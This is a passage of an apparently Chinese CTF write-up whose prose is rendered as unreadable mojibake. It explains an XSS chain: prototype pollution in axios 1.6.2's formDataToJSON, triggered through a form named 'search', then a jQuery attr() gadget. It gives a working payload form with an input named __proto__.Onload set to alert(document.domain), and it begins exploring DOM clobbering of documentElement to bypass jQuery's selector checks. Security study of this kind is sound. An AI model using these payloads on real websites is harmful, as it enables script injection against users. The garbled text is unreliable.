class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶å¯¦ä¸Šé¢é€™ä¸€æ®µï¼Œä¸¦æ²’æœ‰çœ‹å‡ºä»€éº¼æœ‰æ¼æ´çš„åœ°æ–¹ï¼Œå› æ­¤çœ‹å®Œé€™æ®µä¹‹å¾Œï¼Œæˆ‘å°±å…ˆå¾€ç”¨åˆ°çš„ library å»æ‰¾ï¼Œé€™é¡Œç”¨åˆ°çš„æ˜¯ jQuery 3.7.1 ä»¥åŠ axios 1.6.2ï¼Œé›–ç„¶æª”æ¡ˆåç¨±æ²’å¯«ï¼Œä½†æ˜¯å¾æª”æ¡ˆå…§å®¹å¯ä»¥çœ‹å¾—å‡ºä¾†ã€‚</p><p>æŸ¥äº†ä¸€ä¸‹å¯ä»¥ç™¼ç¾ 1.6.2 ä¸¦éæœ€æ–°ç‰ˆæœ¬ï¼Œè€Œä¸”åœ¨ 1.6.4 ä¸­ä¿®å¾©äº†ä¸€å€‹ prototype pollution çš„æ¼æ´ï¼š<a href="https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e">https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e</a></p><p>commit è£¡é¢æ›´æ˜¯ç›´æ¥é™„ä¸Šäº† exploitï¼Œéå¸¸è²¼å¿ƒï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">it</span><span class="token punctuation">(</span><span class="token string">'should resist prototype pollution CVE'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[0]'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[1]'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'__proto__.x'</span><span class="token punctuation">,</span> <span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'constructor.prototype.y'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token function">formDataToJSON</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">foo</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token literal-property property">constructor</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">prototype</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token string">'value'</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ commit å¯ä»¥çœ‹å‡º axios ä¸­æœ‰ä¸€å€‹å«åš <code>formDataToJSON</code> çš„å‡½å¼ï¼ŒæœƒæŠŠ FormData è½‰ç‚º JSONï¼Œè€Œè½‰æ›çš„ç¨‹å¼ç¢¼ä¸­å­˜æœ‰æ¼æ´ï¼Œå¯ä»¥é€é name é€²è¡Œ prototype pollutionã€‚</p><p>æ¥è‘—å†å›ä¾†çœ‹é¡Œç›®çš„ç¨‹å¼ç¢¼ï¼Œæœ‰ä¸€æ®µæ˜¯ï¼š<code>axios.post(&quot;/search&quot;, $(&quot;#search&quot;).get(0)</code>ï¼Œå› æ­¤åªè¦èƒ½æŒæ¡ <code>#search</code>ï¼Œå°±èƒ½æŒæ¡é€™é‚Šå‚³å…¥çš„åƒæ•¸ï¼Œå¾ axios çš„åŸå§‹ç¢¼ä¸­å¯ä»¥çœ‹å‡ºé€™é‚Šå‚³å…¥çš„ formï¼Œæœ€å¾Œæœƒè¢«å–å‡º FormDataï¼Œä¸¦ä¸”å‚³çµ¦ <code>formDataToJSON</code>ï¼ˆé€™é‚Šå¼•ç”¨çš„éƒ¨åˆ†ç¨‹å¼ç¢¼çœ‹ä¸å‡ºä¾†ï¼Œä½†åªè¦ trace ä¸€ä¸‹ä¹‹å¾Œä¸é›£ç™¼ç¾é€™ä»¶äº‹ï¼‰ã€‚</p><p>å› æ­¤ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ name æ³¨å…¥ä¸€å€‹ <code>&lt;form&gt;</code> ä¾†é€²è¡Œ prototype pollutionï¼Œä¸‹ä¸€æ­¥å°±è¦å°‹æ‰¾ gadget äº†ï¼Œé€šå¸¸åœ¨æ‰¾ gadget çš„æ™‚å€™ï¼Œæœƒå…ˆå¾ç‰©ä»¶ä¸‹æ‰‹ã€‚</p><p>è€Œç¨‹å¼ç¢¼ä¸­æœ‰å€‹éƒ¨åˆ†éå¸¸å¯ç–‘ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é€™è£¡å‚³å…¥çš„åƒæ•¸æ˜¯å€‹ç‰©ä»¶ï¼Œå¦‚æœ <code>.attr</code> å‡½å¼æ²’æœ‰ç‰¹åˆ¥åšæª¢æŸ¥ï¼Œå¾ˆæœ‰å¯èƒ½æœƒè¢«æ±¡æŸ“çš„åƒæ•¸å½±éŸ¿ï¼Œè€Œäº‹å¯¦ä¸Šä¹Ÿæ˜¯é€™æ¨£ï¼Œåœ¨ jQuery ä¸­ï¼Œ<a href="https://github.com/jquery/jquery/blob/3.7.1/src/attributes/attr.js#L16">attr çš„å¯¦ä½œå¦‚ä¸‹</a>ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">jQuery<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>    <span class="token function-variable function">attr</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">name<span class="token punctuation">,</span> value</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> jQuery<span class="token punctuation">.</span>attr<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/jquery/jquery/blob/main/src/core/access.js#L12">access çš„éƒ¨åˆ†å¯¦ä½œ</a>ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token parameter">elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> chainable<span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>        len <span class="token operator">=</span> elems<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        bulk <span class="token operator">=</span> key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment">// Sets many values</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">toType</span><span class="token punctuation">(</span> key <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"object"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        chainable <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token keyword">in</span> key <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">access</span><span class="token punctuation">(</span> elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> i<span class="token punctuation">,</span> key<span class="token punctuation">[</span> i <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå‚³å…¥çš„ key æ˜¯å€‹ objectï¼Œæœƒç”¨ in ä¾†å–å‡ºæ¯ä¸€å€‹ key è¨­å®šã€‚ç”±æ–¼ in æœƒå–å‡ºåŸå‹éˆä¸Šçš„å±¬æ€§ï¼Œå› æ­¤å¯ä»¥é€éæ±¡æŸ“ <code>onload</code>ï¼Œè®“ jQuery å»è¨­å®š onload å±¬æ€§ã€‚</p><p>payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>search</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>__proto__.onload</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(document.domain)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>q</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>react-d3</span><span class="token punctuation">></span></span>&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹èµ·ä¾†æ²’ä»€éº¼å•é¡Œï¼Œä½†å˜—è©¦éå¾Œï¼Œæœƒç™¼ç¾å‡ºç¾äº†éŒ¯èª¤ï¼š</p><pre class="line-numbers language-none"><code class="language-none">Uncaught (in promise) TypeError: Cannot use &#39;in&#39; operator to search for &#39;set&#39; in alert(document.domain)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¶“éä¸€é™£ debug ä¹‹å¾Œï¼Œæœƒç™¼ç¾é€™æ®µéŒ¯èª¤æ˜¯æºè‡ªæ–¼è¨­ç½® attr æ™‚çš„é€™ä¸€æ®µï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Attribute hooks are determined by the lowercase version</span><span class="token comment">// Grab necessary hook if one is defined</span><span class="token keyword">if</span> <span class="token punctuation">(</span> nType <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">!</span>jQuery<span class="token punctuation">.</span><span class="token function">isXMLDoc</span><span class="token punctuation">(</span> elem <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    hooks <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>attrHooks<span class="token punctuation">[</span> name<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token operator">||</span>        <span class="token punctuation">(</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">.</span>bool<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> name <span class="token punctuation">)</span> <span class="token operator">?</span> boolHook <span class="token operator">:</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        jQuery<span class="token punctuation">.</span><span class="token function">removeAttr</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> name <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> hooks <span class="token operator">&amp;&amp;</span> <span class="token string">"set"</span> <span class="token keyword">in</span> hooks <span class="token operator">&amp;&amp;</span>        <span class="token punctuation">(</span> ret <span class="token operator">=</span> hooks<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> value<span class="token punctuation">,</span> name <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    elem<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> value <span class="token operator">+</span> <span class="token string">""</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœƒå…ˆåŸ·è¡Œåˆ° <code>hooks = jQuery.attrHooks[ name.toLowerCase() ]</code>ï¼Œç”±æ–¼æˆ‘å€‘æ±¡æŸ“äº† <code>onload</code> å±¬æ€§ï¼Œæ‰€ä»¥ <code>jQuery.attrHooks[&#39;onload&#39;]</code> æœƒæ˜¯å­—ä¸²ï¼Œå› æ­¤ hooks ä¹Ÿæ˜¯å€‹å­—ä¸²ã€‚</p><p>æ¥è‘—åŸ·è¡Œåˆ° <code>&quot;set&quot; in hooks</code>ï¼Œç”±æ–¼å­—ä¸²ä¸¦æ²’æœ‰ <code>in</code> å¯ä»¥ç”¨ï¼Œå› æ­¤æ‹‹å‡ºäº†å…ˆå‰çœ‹åˆ°çš„éŒ¯èª¤ã€‚</p><p>æ—¢ç„¶çŸ¥é“å•é¡Œåœ¨å“ªäº†ï¼Œé‚£è§£æ±ºæ–¹å¼å°±ç°¡å–®äº†ï¼ŒæŠŠ <code>onload</code> æ”¹æˆ <code>Onload</code> å°±å¥½ï¼Œå› ç‚ºå¦‚æ­¤ä¸€ä¾† <code>name.toLowerCase()</code> å°±æœƒæ˜¯ <code>onload</code>ï¼Œè€Œ <code>jQuery.attrHooks[&#39;onload&#39;]</code> ä¸¦ä¸å­˜åœ¨ã€‚</p><p>åšåˆ°é€™è£¡ï¼Œé¡Œç›®å°±è§£é–‹äº†ï¼Œé›£åº¦æ¯”æˆ‘æƒ³åƒä¸­çš„å®¹æ˜“å¾ˆå¤šï¼Œå¤§ç´„èŠ±å€‹ 3-4 å€‹å°æ™‚å·®ä¸å¤šã€‚æ¥è‘—ï¼Œæˆ‘çœ‹åˆ°äº†ä½œè€…çš„<a href="https://twitter.com/kevin_mizu/status/1744552795410456756">æ¨ç‰¹</a>ï¼Œæ„è­˜åˆ°åŸä¾†æ˜¯æœ‰ unintendedï¼Œé›£æ€ªé›£åº¦æ¯”æˆ‘æƒ³å¾—è¦ä½ã€‚</p><h2><span id="é æœŸè§£æ³•ä¹Ÿæ²’é€™éº¼é›£å—">é æœŸè§£æ³•ä¹Ÿæ²’é€™éº¼é›£â€¦å—ï¼Ÿ</span></h2><p>çŸ¥é“è‡ªå·±çš„è§£æ³•æ˜¯éé æœŸä¹‹å¾Œï¼Œå°±é–‹å§‹æ€è€ƒèµ·ä»€éº¼æ‰æ˜¯é æœŸè§£ï¼Œä½œè€…æœ‰åœ¨ Discord è£¡é¢èªªé æœŸè§£æ³•è·Ÿç¾åœ¨çš„éé æœŸè§£æ³•ï¼Œä½¿ç”¨åˆ°çš„åœ°æ–¹å®Œå…¨ä¸åŒï¼Œå› æ­¤å¯ä»¥æƒ³åƒæ˜¯æŠŠ <code>attr(&#123;&#125;)</code> é‚£ä¸€æ®µæ’é™¤ï¼Œç•™ä¸‹å‰©ä¸‹çš„ç¨‹å¼ç¢¼ï¼Œå°±åªå‰©é€™äº›ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‰©ä¸‹çš„ç¨‹å¼ç¢¼ä¸­ï¼Œæˆ‘çš„ç›´è¦ºå‘Šè¨´æˆ‘é‡é»æ˜¯é€™ä¸€è¡Œï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœå¯ä»¥åˆ©ç”¨ prototype pollution æŠŠ <code>$(&quot;img.avatar&quot;)</code> è®Šæˆ <code>$(&#39;#homepage&#39;)</code>ï¼Œé¸åˆ°é‚£å€‹ iframe çš„è©±ï¼Œå†æ­é…ä¸Šæˆ‘å€‘å¯ä»¥æŒæ¡ <code>repo.owner.avatar_url</code>ï¼Œå°±èƒ½æŠŠ iframe çš„ src è¨­ç½®æˆ <code>javascript:alert(1)</code>ï¼Œé”æˆ XSSã€‚</p><p>æˆ‘è¦ºå¾—é€™å€‹çŒœæ¸¬éå¸¸åˆç†ï¼Œå¤§æ¦‚æœ‰ä¹æˆçš„æŠŠæ¡æ˜¯å°çš„ï¼Œå› ç‚ºé€é prototype pollution ä¾†å½±éŸ¿ selector é€™å€‹æ‹›æ•¸æ‡‰è©²æ˜¯æ–°çš„ï¼Œè‡³å°‘æˆ‘ä¹‹å‰æ²’çœ‹éï¼Œè€Œä¸”é€™å€‹å¾ˆé…·ï¼ä¹Ÿç¬¦åˆäº†ä½œè€…åœ¨æ¨ç‰¹ä¸Šè¬›çš„ï¼šã€Œsuper interestingã€</p><p>å› æ­¤ï¼Œæ¥ä¸‹ä¾†æˆ‘å°±èŠ±äº†é»æ™‚é–“é–‹å§‹å°‹æ‰¾ selector æ˜¯æ€éº¼é‹ä½œçš„ï¼Œä½†é€™æ®µç¨‹å¼ç¢¼æ¯”æˆ‘æƒ³åƒä¸­è¤‡é›œäº†ä¸å°‘ï¼Œè€Œä¸”ç‰½æ¶‰åˆ°è¨±å¤šå‡½å¼ã€‚</p><p>èŠ±äº†å››äº”å€‹å°æ™‚ä¹‹å¾Œï¼Œçµ‚æ–¼æ‰¾åˆ°ä¸€å€‹å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚</p><p>é¦–å…ˆï¼Œåœ¨åŸ·è¡Œ <code>$()</code> çš„æ™‚å€™ï¼Œåº•å±¤æ˜¯ç”¨ <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L197">find</a> ä¾†æ‰¾åˆ°å°æ‡‰çš„å…ƒç´ ï¼Œè€Œé€™é‚Šæœƒæœ‰ä¸€å€‹ <code>documentIsHTML</code> çš„æª¢æŸ¥ï¼Œå¦‚æœæ˜¯ true çš„è©±ï¼ŒåŸºæœ¬ä¸Šå°±æœƒå°±æ˜¯åˆ©ç”¨ querySelector ä¹‹é¡çš„åŸç”Ÿ API å»å°‹æ‰¾ï¼Œæ²’æœ‰æ“ä½œç©ºé–“ã€‚</p><p>å› æ­¤æˆ‘å€‘è¦å…ˆæƒ³è¾¦æ³•è®“å®ƒæ˜¯ falseï¼Œåˆ¤æ–·çš„ç¨‹å¼ç¢¼åœ¨<a href="https://github.com/jquery/jquery/blob/3.7.1/src/core.js#L330">é€™è£¡</a>ï¼Œåªè¦è®“ <code>isXMLDoc</code> å›å‚³ trueï¼Œ<code>documentIsHTML</code> å°±æœƒæ˜¯ falseï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">isXMLDoc</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">elem</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> namespace <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> elem<span class="token punctuation">.</span>namespaceURI<span class="token punctuation">,</span>        docElem <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> elem<span class="token punctuation">.</span>ownerDocument <span class="token operator">||</span> elem <span class="token punctuation">)</span><span class="token punctuation">.</span>documentElement<span class="token punctuation">;</span>    <span class="token comment">// Assume HTML when documentElement doesn't yet exist, such as inside</span>    <span class="token comment">// document fragments.</span>    <span class="token keyword">return</span> <span class="token operator">!</span>rhtmlSuffix<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> namespace <span class="token operator">||</span> docElem <span class="token operator">&amp;&amp;</span> docElem<span class="token punctuation">.</span>nodeName <span class="token operator">||</span> <span class="token string">"HTML"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘å€‘å¯ä»¥é€é DOM clobbering å»è¦†è“‹æ‰ <code>documentElement</code>ï¼Œä¾†è®“ <code>docElem</code> è®Šæˆä¸€å€‹ <code>&lt;img&gt;</code>ï¼Œå› ç‚ºä¸æ˜¯ <code>&lt;html&gt;</code>ï¼Œå°±å¯ä»¥è®“æª¢æŸ¥å¤±æ•ˆï¼Œä¸¦ä¸”è®“ <code>isXMLDoc</code> è®Šæˆ trueã€‚</p><p>ç¹éäº†æª¢æŸ¥ä»¥å¾Œï¼Œå°±æš«æ™‚ä¸æœƒç”¨åŸç”Ÿçš„é‚£äº› APIï¼Œè€Œæ˜¯åŸ·è¡Œåˆ° <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L2001">select</a> å‡½å¼ï¼Œé–‹é ­æœƒå…ˆå°‡ selector åš <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1479">tokenize</a>ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> parseOnly</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> matched<span class="token punctuation">,</span> match<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> type<span class="token punctuation">,</span>        soFar<span class="token punctuation">,</span> groups<span class="token punctuation">,</span> preFilters<span class="token punctuation">,</span>        cached <span class="token operator">=</span> tokenCache<span class="token punctuation">[</span> selector <span class="token operator">+</span> <span class="token string">" "</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> cached <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> parseOnly <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> cached<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 